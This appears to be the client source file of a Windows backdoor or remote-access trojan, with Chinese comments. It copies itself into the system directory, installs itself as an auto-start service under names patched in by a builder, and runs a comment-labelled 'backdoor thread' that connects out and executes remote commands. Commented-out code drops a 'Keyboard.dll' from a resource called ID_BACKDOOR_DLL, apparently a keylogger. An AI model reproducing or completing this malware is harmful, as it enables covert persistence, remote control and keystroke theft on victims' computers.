// Client.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "Common.h"
#include "ThreadMain.h"

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"User32.lib")
#pragma comment(lib,"Advapi32.lib")

//#pragma comment( linker, "/subsystem:windows /entry:wmainCRTStartup" )
#define EXE_NAME _T("Client.exe")

void Client();
DWORD WINAPI RunService(LPVOID lparam);

char ServiceName[220] =
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

char ShowName[220] = 
"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";

char Description[220] = 
"CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC";

wchar_t Auto[] = L"AutorunFlag";

char info[220] = "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU";

SERVICE_STATUS        ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;

/*
参数：DWORD
返回值：void
功能：服务状态控制
*/
void WINAPI ServiceControl(DWORD dwCode)
{
	switch (dwCode)
	{
		//服务暂停
	case SERVICE_CONTROL_PAUSE:
		ServiceStatus.dwCurrentState = SERVICE_PAUSED;
		break;
		//服务继续
	case SERVICE_CONTROL_CONTINUE:
		ServiceStatus.dwCurrentState = SERVICE_RUNNING;
		break;
		//服务停止
	case SERVICE_CONTROL_STOP:
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		ServiceStatus.dwWin32ExitCode = 0;
		ServiceStatus.dwCheckPoint = 0;
		ServiceStatus.dwWaitHint = 0;
		//设置服务状态
		if (SetServiceStatus(ServiceStatusHandle, &ServiceStatus) == 0)
		{
			printf("SetServiceStatus in ServiceControl in Switch Error !\n");
		}
		return;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	case SERVICE_CONTROL_SHUTDOWN:
		ServiceStatus.dwWin32ExitCode = 0;
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
	default:
		break;
	}
	//设置服务状态
	if (SetServiceStatus(ServiceStatusHandle, &ServiceStatus) == 0)
	{
		printf("SetServiceStatus in ServiceControl out Switch Error !\n");
	}
	return;
}
/*
参数：DWORD dwArgc, LPTSTR *lpArgv
返回值：void
功能：服务入口函数
*/
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpArgv)
{
	//填写SERVICE_STATUS 结构
	ServiceStatus.dwServiceType = SERVICE_WIN32;
	ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN
		| SERVICE_ACCEPT_PAUSE_CONTINUE;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwWin32ExitCode = 0;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;
	//注册服务控制函数
	ServiceStatusHandle = RegisterServiceCtrlHandlerW((wchar_t*)ServiceName, ServiceControl); //服务名
	if (ServiceStatusHandle == 0)
	{
		printf("RegisterServiceCtrlHandler Error !\n");
		return;
	}
	ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;
	//设置服务状态
	if (SetServiceStatus(ServiceStatusHandle, &ServiceStatus) == 0)
	{
		printf("SetServiceStatus Error !\n");
		return;
	}
	//启动后门线程
	::CloseHandle(CreateThread(NULL, 0, RunService, NULL, 0, NULL));
	return;
}

/*
功能：运行服务
*/
DWORD WINAPI RunService(LPVOID lparam)
{
	Client();
	return 0;
}

/*
功能：安装服务
*/
int APIENTRY InstallService()
{
	SC_HANDLE        schSCManager;
	SC_HANDLE        schService;
	DWORD            dwErrorCode;
	SERVICE_STATUS   InstallServiceStatus;
	SERVICE_DESCRIPTION description;
	description.lpDescription = (wchar_t*)Description; //服务描述信息
	wchar_t SysPath[260];
	wchar_t SelfFile[260];
	GetSystemDirectory(SysPath, sizeof(SysPath));
	wcscat_s(SysPath, _T("\\")); //服务程序
	wcscat_s(SysPath, EXE_NAME);
	GetModuleFileNameW(NULL, SelfFile, MAX_PATH);
	//复制自身到系统目录
	CopyFileW(SelfFile, SysPath, false);
	//打开服务控制管理器数据库
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager == NULL)
	{
		printf("OpenSCManager Error !\n");
		return 0;
	}
	//创建服务
	/*
	schService=CreateServiceW(schSCManager,(wchar_t*)ServiceName,(wchar_t*)ShowName,SERVICE_ALL_ACCESS, //服务名，显示名
	SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,
	SERVICE_ERROR_IGNORE,SysPath,NULL,NULL,NULL,NULL,NULL);
	*/
	schService = CreateServiceW(
		schSCManager,
		(wchar_t*)ServiceName,  //服务名
		(wchar_t*)ShowName,     //显示名
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_IGNORE,
		SysPath,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
		);
	//创建失败
	if (schService == NULL)
	{
		dwErrorCode = GetLastError();
		if (dwErrorCode != ERROR_SERVICE_EXISTS)
		{
			printf("CreateService Error !\n");
			CloseServiceHandle(schSCManager);
			return 0;
		}
		//如果服务存在
		else
		{
			//假如服务已存在则打开服务
			schService = OpenService(schSCManager, (wchar_t*)ServiceName, SERVICE_START); //服务名
			//打开失败
			if (schService == NULL)
			{
				printf("OpenService Error !\n");
				CloseServiceHandle(schSCManager);
				return 0;
			}
		}
	}
	else if (description.lpDescription != NULL)
	{
		ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &description);
	}

	//启动服务
	if (StartService(schService, 0, NULL) == 0)
	{
		dwErrorCode = GetLastError();
		//服务正在运行
		if (dwErrorCode == ERROR_SERVICE_ALREADY_RUNNING)
		{
			printf("StartService Error !\n");
			CloseServiceHandle(schSCManager);
			CloseServiceHandle(schService);
			return 0;
		}
	}
	//查询服务状态
	while (QueryServiceStatus(schService, &InstallServiceStatus) != 0)
	{   //服务是否在初始化阶段
		if (InstallServiceStatus.dwCurrentState == SERVICE_START_PENDING)
		{
			Sleep(100);
		}
		else
		{
			break;
		}
	}
	//查询服务状态，看有没有启动成功
	if (InstallServiceStatus.dwCurrentState != SERVICE_RUNNING)
	{
		printf("Install service Failed\n");
	}
	else
	{
		printf("Install service Successed\n");
	}
	CloseServiceHandle(schSCManager);
	CloseServiceHandle(schService);
	return 1;
}


int _tmain(int argc, _TCHAR* argv[])
{
	/*
	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		//服务程序的名称和入口点
		{ (wchar_t*)ServiceName, ServiceMain }, //服务名
		//SERVICE_TABLE_ENTRY结构必须以“NULL”结束
		{ NULL, NULL }
	};
	//连接服务控制管理器，开始控制调度程序线程
	StartServiceCtrlDispatcherW(DispatchTable);

	
	//释放Dll
	wchar_t DllPath[256];
	GetSystemDirectoryW(DllPath, sizeof(DllPath));
	//得到DLL带路径文件名
	wcscat_s(DllPath, _T("\\Keyboard.dll"));
	//把资源导出成为DLL文件
	ResourceToFile(DllPath, MAKEINTRESOURCEW(ID_BACKDOOR_DLL), MAKEINTRESOURCEW(RC_DLL));


	InstallService();
	*/
	Client();
	return 0;
}

void Client()
{
	if (!strcmp("UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU", info))
	{
		printf("尚未配置程序\n");
		return;
	}
	CThreadMain Thread_Main;
	Thread_Main.RunFlag = true;
	Thread_Main.GetInfo(info); //获取配置信息
	/*
	if (Auto[1] == '1')
	{
		wcscpy_s(Thread_Main.MyServiceName, (wchar_t*)ServiceName);
	}
	*/
	while (true)
	{
		if (Thread_Main.RunFlag == false)
		{
			break;
		}
		SOCKET sock;
		sock = Thread_Main.Run();
		Thread_Main.Command(sock);
	}
}


